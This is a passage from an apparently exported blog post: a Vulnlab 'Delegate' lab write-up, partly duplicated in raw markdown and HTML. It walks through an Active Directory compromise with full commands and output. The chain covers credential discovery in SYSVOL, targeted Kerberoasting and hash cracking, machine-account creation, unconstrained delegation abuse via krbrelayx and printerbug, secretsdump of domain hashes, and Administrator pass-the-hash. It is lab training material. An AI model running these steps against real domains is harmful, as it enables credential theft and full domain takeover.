Enabled\nSeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled\n```\n\nIt seems as though they have `SeEnableDelegationPrivilege`, which is a new privilege that I have not encountered before. This specific privilege allows us to enable the trusted asset for computer and user accounts.\n\nYou can find documentation on this privilege [here](https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html). Essentially, this privilege allows our user to impersonate other accounts or computers. The interesting thing about this privilege is that we can essentially set delegation properties to be configured on behalf of user and computer objects, hence the ability for us to `Enable` delegation.\n\nAnother interesting part about this is the fact that we can do this for computer accounts as well. While we don't have access to any machine accounts currently, our current user does have a property that isn't normally enabled to user accounts. That specific property is our MAQ, or `MachineAccountQuota`. This specific property allows us to create computer accounts within the context of our current users permissions.\n\n```\n└─$ crackmapexec ldap 10.10.87.35 -u 'N.Thompson' -p '[...snip...]' -M maq\nSMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.87.35     389    DC1              [+] delegate.vl\\N.Thompson:[...snip...]\nMAQ         10.10.87.35     389    DC1              [*] Getting the MachineAccountQuota\nMAQ         10.10.87.35     389    DC1              MachineAccountQuota: 10\n```\n\nAs you can see, it seems as though `N.Thompson` has a MAQ of 10. In order to add computer accounts to the domain, a minimum MAQ of 1 is required.\n\n# Exploiting Unconstrained Delegation\n\nAt this point, the attack path becomes relatively clear. What we'll need to do is perform [Unconstrained Delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/):\n\n* Create a computer account and add its DNS entry to `EXAMPLE.delegate.vl` to point to our attacker machine.\n* Use `krbrelayx` to listen for incoming Kerberos keys and cache them accordingly.\n* Coerce an authentication attempt from the DC and capture the authentication request with `krbrelayx`. (We can use `printerbug` for this)\n* Use the captured DC service ticket to dump the domain secrets.\n\nI found reference on how to do this locally from our Kali machine [here](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained). While I had given it a try to use `addcomputer` in Impacket's library to do this, the issue is that it does not add the sufficient SPNs that you need on the machine account to perform unconstrained delegation. The only SPN that you have the ability to add with `addcomputer` is `HTTP/(account).delegate.vl`.\n\nThe list of the required SPNs is below. I used [Powermad](https://github.com/Kevin-Robertson/Powermad) to get the specific attributes of a machine account I had configured.\n\n```\nHTTP/dazzad.delegate.vl\nRestrictedKrbHost/dazzad\nHOST/dazzad\nRestrictedKrbHost/dazzad.delegate.vl\nHOST/dazzad.delegate.vl\n```\n\nLuckily enough, when you add a machine account via Powermad, it should add these SPNs for you. There is also an additional SPN identifier that we'll need to have to ensure that the delegation rights are set correctly on the account.\n\nLet's first start by creating the computer account through WinRM.\n\n```\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> New-MachineAccount -MachineAccount dazzad -Password $(ConvertTo-SecureString 'DazPassword123@' -AsPlainText -Force)\n```\n\nNext, we'll add the SPNs to the machine account so that it can properly exploit the delegation.\n\n```\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> Set-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Value HTTP/dazzad.delegate.vl -Append\n[+] Machine account dazzad attribute ServicePrincipalName appended\n\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> Set-MachineAccountAttribute -MachineAccount dazzad -Attribute userAccountControl -Value 528384\n[+] Machine account daz attribute userAccountControl updated\n```\n\nWe can verify our changes to the machine account by running `Get-MachineAccountAttribute` against the machine account we created.\n\n```\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> Get-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Verbose\nVerbose: [+] Domain Controller = DC1.delegate.vl\nVerbose: [+] Domain = delegate.vl\nVerbose: [+] Distinguished Name = CN=dazzad,CN=Computers,DC=delegate,DC=vl\nHTTP/dazzad.delegate.vl\nRestrictedKrbHost/dazzad\nHOST/dazzad\nRestrictedKrbHost/dazzad.delegate.vl\nHOST/dazzad.delegate.vl\n```\n\nNow that we have the respective SPNs set for this exploit, we can move back to our Kali machine for the rest of the exploit.\n\nWe'll need to add the LDAP record to `delegate.vl` to ensure that when we force it to authenticate to our machine account, it will redirect back to our MITM `krbrelayx` handler.\n\n```\n└─$ python3 krbrelayx/dnstool.py -u 'delegate.vl\\dazzad$' -p 'DazPassword123@' -r DAZZAD.delegate.vl -d (KALI IP) --action add -dns-ip 10.10.92.191 dc1.delegate.vl                        \n[-] Connecting to host...\n[-] Binding to host\n[+] Bind OK\n[-] Adding new record\n[+] LDAP operation completed successfully\n```\n\nNow that all of that is set, we can start our `krbrelayx` listener to listen for incoming requests.\n\n```\n└─$ python3 krbrelayx/krbrelayx.py --krbsalt 'DELEGATE\\DAZ$' --krbpass 'DazPassword123@'\n```\n\nWe'll then use `printerbug` to exploit the authentication coercion. This should force the DC to authenticate to our machine account, meaning the Kerberos TGT used to access our fake machine will be cached during the authentication exchange.\n\n```\n└─$ python3 krbrelayx/printerbug.py delegate.vl/'DAZ$':'DazPassword123@'@dc1.delegate.vl DAZZAD.delegate.vl\n[*] Impacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Attempting to trigger authentication via rprn RPC at dc1.delegate.vl\n[*] Bind OK\n[*] Got handle\nDCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Triggered RPC backconnect, this may or may not have worked\n```\n\nWhile we do get an `access_denied` error, if you look back at our `krbrelayx` listener - it should have received the authentication attempt and cached the DC's service ticket in a `.ccache` file.\n\n```\n[*] Setting up DNS Server\n[*] Servers started, waiting for connections\n[*] SMBD: Received connection from 10.10.92.191\n[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]\n[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache\n```\n\nNow that we have the service ticket for the DC, we can import this into our Kerberos authentication global variable to dump the respective secrets. I opted to rename the ticket file just so that the special characters don't interfere with the global variable's interpretation of the file.\n\n```\n└─$ cp 'DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache' dc.ccache\n\n└─$ export KRB5CCNAME=dc.ccache\n```\n\nWe can now dump the secrets of the DC with our ticket using `secretsdump`.\n\n```\n└─$ impacket-secretsdump -k dc1.delegate.vl\n......\n[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nIf you have done all of the required steps, you should have the NT hash for the Administrator user. We can now use this to login to DC via WinRM.\n\n```\n└─$ crackmapexec winrm 10.10.92.191 -u 'Administrator' -H '[...snip...]'\nSMB         10.10.92.191    5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)\nHTTP        10.10.92.191    5985   DC1              [*] http://10.10.92.191:5985/wsman\nWINRM       10.10.92.191    5985   DC1              [+] delegate.vl\\Administrator:[...snip...] (Pwn3d!)\n```\n\n```\n└─$ evil-winrm --ip 10.10.92.191 -u 'Administrator' -H '[...snip...]'\n\nEvil-WinRM shell v3.5\n \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat ..\\Desktop\\root.txt\nVL[...snip...]\n```\n\nNow that we have read the root flag and have access via WinRM as the Administrator user, we have successfully completed this machine!\n\n# Conclusion\n\nThis machine specifically was difficult (for priv esc) as it involved exploiting unconstrained delegation REMOTELY. I've only exploited unconstrained delegation between machines, to which one of them I had access as SYSTEM. This was something new to learn, and the `MachineAccountQuota` attribute is something that is definitely helpful as part of the exploit process.\n\nBig thanks to `geiseric` for creating this machine.\n\n# Resources\n\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://github.com/ShutdownRepo/targetedKerberoast\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html\nhttps://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/\nhttps://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html\nhttps://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained\nhttps://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota\nhttps://github.com/Kevin-Robertson/Powermad\n","source":"_posts/delegate.md","raw":"---\ntitle: Delegate - Vulnlab\ndate: 2024-06-30 13:16:36\ntags: [vulnlab, Medium]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Windows'\ndescription: Delegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring some exploits such as unconstrained delegation and GenericWrite privileges.\ncover: /images/vulnlab/delegate-vl/delegate_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nDelegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring some exploits such as unconstrained delegation and GenericWrite privileges.\n\n# Enumeration\n\nLet's start by doing our usual NMAP scans of the machine.\n\n```\n└─$ sudo nmap 10.10.87.35\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 00:50 EDT\nNmap scan report for delegate.vl (10.10.87.35)\nHost is up (0.11s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 7.17 seconds\n```\n\nAs stated before in the introduction, this machine is strictly AD. This means we won't need to enumerate any form of web server to gain access to a user list.\n\nLet's run crackmapexec against the IP address to get the DNS name of the machine. Since this machine as ports 53 and 88, we can assume that it is a DC.\n\n```\n└─$ crackmapexec smb 10.10.87.35                                   \nSMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)\n```\n\nWe'll add the DNS name `dc1.delegate.vl` and `delegate.vl` to our `/etc/hosts` file.\n\nLet's look at SMB to see if there are any files that are being hosted that we can exfil to our Kali machine.\n\n```\n└─$ smbclient -L 10.10.87.35 -N          \n\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nSYSVOL          Disk      Logon server share\n```\n\nSince we have null authentication enabled to SMB, we can enumerate the shares without needing credentials. While the default shares seem to be the only shares on this machine, let's still see if there's anything within `NETLOGON` or `SYSVOL`.\n\n```\nsmb: \\delegate.vl\\scripts\\> ls\n  .                                   D        0  Sat Aug 26 08:45:24 2023\n  ..                                  D        0  Sat Aug 26 05:45:45 2023\n  users.bat                           A      159  Sat Aug 26 08:54:29 2023\n\n5242879 blocks of size 4096. 1932408 blocks available\nsmb: \\delegate.vl\\scripts\\> get users.bat\ngetting file \\delegate.vl\\scripts\\users.bat of size 159 as users.bat (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)\n```\n\nI found an interesting `users.bat` file in the startup script folder in `SYSVOL`. Let's pull this down to our local machine to see if it contains any information.\n\n```\n└─$ cat users.bat               \nrem @echo off\nnet use * /delete /y\nnet use v: \\\\dc1\\development \n\nif %USERNAME%==A.Briggs net use h: \\\\fileserver\\backups /user:Administrator [...snip...]\n```\n\nAs you can see from the above, it seems as though we have a user that is accessing a share in their startup script and accessing the backup share in the fileserver as an Administrator.\n\nAssuming that this password is associated with this user, let's run crackmapexec to see if their password is a match.\n\n```\n└─$ crackmapexec smb 10.10.87.35 -u 'A.Briggs' -p '[...snip...]'\nSMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)\nSMB         10.10.87.35     445    DC1              [+] delegate.vl\\A.Briggs:[...snip...]\n\n└─$ crackmapexec ldap 10.10.87.35 -u 'A.Briggs' -p '[...snip...]'\nSMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.87.35     389    DC1              [+] delegate.vl\\A.Briggs:[...snip...]\n```\n\nIt seems as though this is a valid domain user, who has access to both LDAP and SMB. Since we have access to LDAP, we can dump the domain as this user to view all of the domain objects. Let's use Bloodhound with the [Python ingestor](https://github.com/dirkjanm/BloodHound.py) to do this.\n\n```\n└─$ bloodhound-python -d 'delegate.vl' -u 'A.Briggs' -p '(A.BRIGGS PASSWORD)' -c all -ns 10.10.87.35 --zip\n```\n\nThis should return a compressed archive containing all of the domain objects within the AD environment. We'll start up `neo4j` along with the `Bloodhound` GUI in order to view this in a graph.\n\n# GenericWrite over N.Thompson\n\nI did some initial enumeration of the domain objects, specifically the node for `A.Briggs` and what they have access to. It seems they have an interesting outbound object control on another node.\n\n![](/images/vulnlab/delegate-vl/b.png)\n\nFrom the screenshot above, it seems as though we have GenericWrite over the user `N.Thompson`.\n\nThis is much different than what we know about having GenericWrite or GenericAll on a node in the past. For some of my other writeups, we often had these privileges on a domain computer. The process for exploiting this against a domain user is much different - though it is simpler in my opinion.\n\nIf we have GenericWrite over a domain user object, there is a Kerberos exploit we could do. We could perform [targeted Kerberoasting](https://github.com/ShutdownRepo/targetedKerberoast) on the domain object to request a TGS on behalf of them. This TGT will be encrypted with their password, which we can attempt to crack offline.\n\nYou can do this with the GitHub repository provided above. An example command can be found below.\n\n```\n└─$ python3 targetedKerberoast.py -d 'delegate.vl' -u 'A.Briggs' -p '(A.BRIGGS PASSWORD)' --request-user 'N.Thompson'\n[*] Starting kerberoast attacks\n[*] Attacking user (N.Thompson)\n[+] Printing hash for (N.Thompson)\n$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$99c33fd94eb13970a6963667b7589c0a$29314c913d36f[...snip...]88b9ec9b2f6cd7e7f190edb308d9f\n```\n\nAs you can see, this returned a valid TGS for the `N.Thompson` user. I did not need to update any of the dependencies needed for this, though it may be different for you.\n\nLet's now use [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) with a hash-identifier of 13100 to attempt to decrypt this hash.\n\n```\n└─$ hashcat -a 0 -m 13100 nthompson.txt /usr/share/wordlists/rockyou.txt\n......\nf81d26ea14e743da90803146fc62ee86195ff78c872e0422bfb05fcb74c9ec6337b612aaa6338382da5ee166bffe0d275685ab7388b9ec9b2f6cd7e7f190edb308d9f:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\n```\n\nAs you can see from the above, the password was cracked successfully. We can now use this with crackmapexec to see if `N.Thompson` has any valid authentication to any other resources.\n\n![](/images/vulnlab/delegate-vl/c.png)\n\nIt seems as though `N.Thompson` is a part of the `Remote Management Users` group. From my first guess, this means that they can PSRemote into the machine (meaning they have RDP access).\n\n```\n└─$ crackmapexec winrm 10.10.87.35 -u 'N.Thompson' -p '[...snip...]'\nSMB         10.10.87.35     5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)\nHTTP        10.10.87.35     5985   DC1              [*] http://10.10.87.35:5985/wsman\nWINRM       10.10.87.35     5985   DC1              [+] delegate.vl\\N.Thompson:[...snip...] (Pwn3d!)\n```\n\nIt seems as though we have the ability to WinRM into the machine. Let's do so with `evil-winrm`.\n\n```\n└─$ evil-winrm --ip 10.10.87.35 -u 'N.Thompson' -p '(N.THOMPSON PASSWORD)'\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> whoami\ndelegate\\n.thompson\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> hostname\nDC1\n```\n\nThe first user flag is within their home directory, denoted path as `C:\\Users\\N.Thompson\\Desktop\\user.txt`.\n\n# SeEnableDelegationPrivilege and MAQs\n\nI decided not to use Sliver for this, as it really isn't needed aside from transferring files to the machine easily. We'll be doing the rest of this solely from the WinRM session that we have.\n\nIf you run `whoami /priv`, you'll notice an interesting privilege that has been enabled for `N.Thompson`.\n\n```\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                                                    State\n============================= ============================================================== =======\nSeMachineAccountPrivilege     Add workstations to domain                                     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled\nSeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled\n```\n\nIt seems as though they have `SeEnableDelegationPrivilege`, which is a new privilege that I have not encountered before. This specific privilege allows us to enable the trusted asset for computer and user accounts.\n\nYou can find documentation on this privilege [here](https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html). Essentially, this privilege allows our user to impersonate other accounts or computers. The interesting thing about this privilege is that we can essentially set delegation properties to be configured on behalf of user and computer objects, hence the ability for us to `Enable` delegation.\n\nAnother interesting part about this is the fact that we can do this for computer accounts as well. While we don't have access to any machine accounts currently, our current user does have a property that isn't normally enabled to user accounts. That specific property is our MAQ, or `MachineAccountQuota`. This specific property allows us to create computer accounts within the context of our current users permissions.\n\n```\n└─$ crackmapexec ldap 10.10.87.35 -u 'N.Thompson' -p '[...snip...]' -M maq\nSMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.87.35     389    DC1              [+] delegate.vl\\N.Thompson:[...snip...]\nMAQ         10.10.87.35     389    DC1              [*] Getting the MachineAccountQuota\nMAQ         10.10.87.35     389    DC1              MachineAccountQuota: 10\n```\n\nAs you can see, it seems as though `N.Thompson` has a MAQ of 10. In order to add computer accounts to the domain, a minimum MAQ of 1 is required.\n\n# Exploiting Unconstrained Delegation\n\nAt this point, the attack path becomes relatively clear. What we'll need to do is perform [Unconstrained Delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/):\n\n* Create a computer account and add its DNS entry to `EXAMPLE.delegate.vl` to point to our attacker machine.\n* Use `krbrelayx` to listen for incoming Kerberos keys and cache them accordingly.\n* Coerce an authentication attempt from the DC and capture the authentication request with `krbrelayx`. (We can use `printerbug` for this)\n* Use the captured DC service ticket to dump the domain secrets.\n\nI found reference on how to do this locally from our Kali machine [here](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained). While I had given it a try to use `addcomputer` in Impacket's library to do this, the issue is that it does not add the sufficient SPNs that you need on the machine account to perform unconstrained delegation. The only SPN that you have the ability to add with `addcomputer` is `HTTP/(account).delegate.vl`.\n\nThe list of the required SPNs is below. I used [Powermad](https://github.com/Kevin-Robertson/Powermad) to get the specific attributes of a machine account I had configured.\n\n```\nHTTP/dazzad.delegate.vl\nRestrictedKrbHost/dazzad\nHOST/dazzad\nRestrictedKrbHost/dazzad.delegate.vl\nHOST/dazzad.delegate.vl\n```\n\nLuckily enough, when you add a machine account via Powermad, it should add these SPNs for you. There is also an additional SPN identifier that we'll need to have to ensure that the delegation rights are set correctly on the account.\n\nLet's first start by creating the computer account through WinRM.\n\n```\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> New-MachineAccount -MachineAccount dazzad -Password $(ConvertTo-SecureString 'DazPassword123@' -AsPlainText -Force)\n```\n\nNext, we'll add the SPNs to the machine account so that it can properly exploit the delegation.\n\n```\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> Set-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Value HTTP/dazzad.delegate.vl -Append\n[+] Machine account dazzad attribute ServicePrincipalName appended\n\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> Set-MachineAccountAttribute -MachineAccount dazzad -Attribute userAccountControl -Value 528384\n[+] Machine account daz attribute userAccountControl updated\n```\n\nWe can verify our changes to the machine account by running `Get-MachineAccountAttribute` against the machine account we created.\n\n```\n*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents> Get-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Verbose\nVerbose: [+] Domain Controller = DC1.delegate.vl\nVerbose: [+] Domain = delegate.vl\nVerbose: [+] Distinguished Name = CN=dazzad,CN=Computers,DC=delegate,DC=vl\nHTTP/dazzad.delegate.vl\nRestrictedKrbHost/dazzad\nHOST/dazzad\nRestrictedKrbHost/dazzad.delegate.vl\nHOST/dazzad.delegate.vl\n```\n\nNow that we have the respective SPNs set for this exploit, we can move back to our Kali machine for the rest of the exploit.\n\nWe'll need to add the LDAP record to `delegate.vl` to ensure that when we force it to authenticate to our machine account, it will redirect back to our MITM `krbrelayx` handler.\n\n```\n└─$ python3 krbrelayx/dnstool.py -u 'delegate.vl\\dazzad$' -p 'DazPassword123@' -r DAZZAD.delegate.vl -d (KALI IP) --action add -dns-ip 10.10.92.191 dc1.delegate.vl                        \n[-] Connecting to host...\n[-] Binding to host\n[+] Bind OK\n[-] Adding new record\n[+] LDAP operation completed successfully\n```\n\nNow that all of that is set, we can start our `krbrelayx` listener to listen for incoming requests.\n\n```\n└─$ python3 krbrelayx/krbrelayx.py --krbsalt 'DELEGATE\\DAZ$' --krbpass 'DazPassword123@'\n```\n\nWe'll then use `printerbug` to exploit the authentication coercion. This should force the DC to authenticate to our machine account, meaning the Kerberos TGT used to access our fake machine will be cached during the authentication exchange.\n\n```\n└─$ python3 krbrelayx/printerbug.py delegate.vl/'DAZ$':'DazPassword123@'@dc1.delegate.vl DAZZAD.delegate.vl\n[*] Impacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Attempting to trigger authentication via rprn RPC at dc1.delegate.vl\n[*] Bind OK\n[*] Got handle\nDCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Triggered RPC backconnect, this may or may not have worked\n```\n\nWhile we do get an `access_denied` error, if you look back at our `krbrelayx` listener - it should have received the authentication attempt and cached the DC's service ticket in a `.ccache` file.\n\n```\n[*] Setting up DNS Server\n[*] Servers started, waiting for connections\n[*] SMBD: Received connection from 10.10.92.191\n[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]\n[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache\n```\n\nNow that we have the service ticket for the DC, we can import this into our Kerberos authentication global variable to dump the respective secrets. I opted to rename the ticket file just so that the special characters don't interfere with the global variable's interpretation of the file.\n\n```\n└─$ cp 'DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache' dc.ccache\n\n└─$ export KRB5CCNAME=dc.ccache\n```\n\nWe can now dump the secrets of the DC with our ticket using `secretsdump`.\n\n```\n└─$ impacket-secretsdump -k dc1.delegate.vl\n......\n[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nIf you have done all of the required steps, you should have the NT hash for the Administrator user. We can now use this to login to DC via WinRM.\n\n```\n└─$ crackmapexec winrm 10.10.92.191 -u 'Administrator' -H '[...snip...]'\nSMB         10.10.92.191    5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)\nHTTP        10.10.92.191    5985   DC1              [*] http://10.10.92.191:5985/wsman\nWINRM       10.10.92.191    5985   DC1              [+] delegate.vl\\Administrator:[...snip...] (Pwn3d!)\n```\n\n```\n└─$ evil-winrm --ip 10.10.92.191 -u 'Administrator' -H '[...snip...]'\n\nEvil-WinRM shell v3.5\n \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat ..\\Desktop\\root.txt\nVL[...snip...]\n```\n\nNow that we have read the root flag and have access via WinRM as the Administrator user, we have successfully completed this machine!\n\n# Conclusion\n\nThis machine specifically was difficult (for priv esc) as it involved exploiting unconstrained delegation REMOTELY. I've only exploited unconstrained delegation between machines, to which one of them I had access as SYSTEM. This was something new to learn, and the `MachineAccountQuota` attribute is something that is definitely helpful as part of the exploit process.\n\nBig thanks to `geiseric` for creating this machine.\n\n# Resources\n\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://github.com/ShutdownRepo/targetedKerberoast\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html\nhttps://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/\nhttps://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html\nhttps://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained\nhttps://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota\nhttps://github.com/Kevin-Robertson/Powermad\n","slug":"delegate","published":1,"updated":"2024-06-30T17:21:04.931Z","_id":"cly1tg7dz00007vuf8ghq4fy1","comments":1,"layout":"post","photos":[],"content":"<p>Delegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring some exploits such as unconstrained delegation and GenericWrite privileges.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start by doing our usual NMAP scans of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.87.35</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 00:50 EDT</span><br><span class=\"line\">Nmap scan report for delegate.vl (10.10.87.35)</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 988 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds</span><br></pre></td></tr></table></figure>\n\n<p>As stated before in the introduction, this machine is strictly AD. This means we won’t need to enumerate any form of web server to gain access to a user list.</p>\n<p>Let’s run crackmapexec against the IP address to get the DNS name of the machine. Since this machine as ports 53 and 88, we can assume that it is a DC.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.87.35                                   </span><br><span class=\"line\">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br></pre></td></tr></table></figure>\n\n<p>We’ll add the DNS name <code>dc1.delegate.vl</code> and <code>delegate.vl</code> to our <code>/etc/hosts</code> file.</p>\n<p>Let’s look at SMB to see if there are any files that are being hosted that we can exfil to our Kali machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.87.35 -N          </span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">NETLOGON        Disk      Logon server share </span><br><span class=\"line\">SYSVOL          Disk      Logon server share</span><br></pre></td></tr></table></figure>\n\n<p>Since we have null authentication enabled to SMB, we can enumerate the shares without needing credentials. While the default shares seem to be the only shares on this machine, let’s still see if there’s anything within <code>NETLOGON</code> or <code>SYSVOL</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\delegate.vl\\scripts\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sat Aug 26 08:45:24 2023</span><br><span class=\"line\">  ..                                  D        0  Sat Aug 26 05:45:45 2023</span><br><span class=\"line\">  users.bat                           A      159  Sat Aug 26 08:54:29 2023</span><br><span class=\"line\"></span><br><span class=\"line\">5242879 blocks of size 4096. 1932408 blocks available</span><br><span 